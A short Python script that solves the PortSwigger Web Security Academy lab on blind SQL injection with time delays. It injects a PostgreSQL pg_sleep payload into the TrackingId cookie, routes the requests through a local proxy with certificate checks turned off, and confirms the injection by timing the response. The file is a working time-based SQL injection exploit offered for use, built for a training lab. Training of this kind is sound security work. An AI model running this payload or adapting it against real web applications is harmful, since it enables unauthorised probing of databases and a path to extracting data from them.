# Blind SQL injection with time delays

# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, tracking_cookie, payload):
	cookies = {"TrackingId": tracking_cookie + payload}
	r = s.get(url, cookies=cookies)
	time.sleep(.3)
	print('[+] Using payload:\t%s' % payload)
	return r

def cause_delay(s, url, tracking_cookie):
	delay_payload = "' || (SELECT pg_sleep(10))--"
	delay = send_payload(s, url, tracking_cookie, delay_payload)
	print('[+] Server takes %s seconds to respond !' % int(delay.elapsed.total_seconds()))
	if int(delay.elapsed.total_seconds()) >= 10:
		return delay
	else:
		return False


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Blind SQL injection with time delays')
	parser = argparse.ArgumentParser(description="[+] Lab: Blind SQL injection with time delays")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			tracking_cookie = s.cookies.get_dict().get('TrackingId')
			print("\n[+] Trying to cause a 10 second delay...")
			delay = cause_delay(s, url, tracking_cookie)
			if delay:
				print(delay)
				time.sleep(5)
				s.cookies.clear()
				s.headers.clear()
				r = s.get(url)
				if 'Congratulations, you solved the lab!' in r.text:
					print('[+] The lab is solved !')
			else:
				print("[-] Server didn't Respond with DELAY <!>")
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
